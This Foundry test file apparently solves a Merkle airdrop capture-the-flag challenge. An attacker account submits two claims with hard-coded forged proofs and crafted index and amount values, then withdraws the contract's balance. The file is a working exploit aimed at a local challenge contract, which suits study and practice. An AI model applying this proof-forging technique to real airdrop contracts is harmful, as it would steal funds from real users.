// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../contracts/2-merkle/MerkleChallenge.sol";
import "../contracts/2-merkle/MerkleDistributor.sol";

contract MerkleChallengeTest is Test {
    address private developer = 0xAAcF6a8119F7e11623b5A43DA638e91F669A130f;
    address private attacker = 0x11111112e8a4d889b7e66F77a2552a1d1aeBb918;

    MerkleChallenge challenge;

    function setUp() public {
//        vm.createSelectFork("bsc");

        vm.deal(attacker, 1 ether);
        vm.prank(attacker, attacker);
        challenge = new MerkleChallenge();
        vm.deal(address(challenge), 1 ether);
    }

    function test_challenge() public {
        console.log('balance', address(challenge).balance);
        console.log('max uint256', type(uint256).max);

        uint256 maxUint256 = type(uint256).max;

        uint256 beforeBalance = attacker.balance;
        vm.startPrank(attacker);
        challenge.register();


        MerkleDistributor merkleDistributor = MerkleDistributor(challenge.merkleDistributorMap(attacker));
        bytes32[] memory merkleProof1 = new bytes32[](5);
        merkleProof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);
        merkleProof1[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);
        merkleProof1[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);
        merkleProof1[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        merkleProof1[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
        merkleDistributor.claim(
            0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442,
            address(0x00d48451c19959e2d9bd4e620fbe88aa5f6f7ea72a),
            0x00000f40f0c122ae08d2207b,
            merkleProof1
        );

        bytes32[] memory merkleProof2 = new bytes32[](6);
        merkleProof2[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);
        merkleProof2[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);
        merkleProof2[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);
        merkleProof2[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);
        merkleProof2[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        merkleProof2[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
        merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);

        challenge.withdraw();

        console.log('earned', attacker.balance - beforeBalance);
        vm.stopPrank();
    }
}
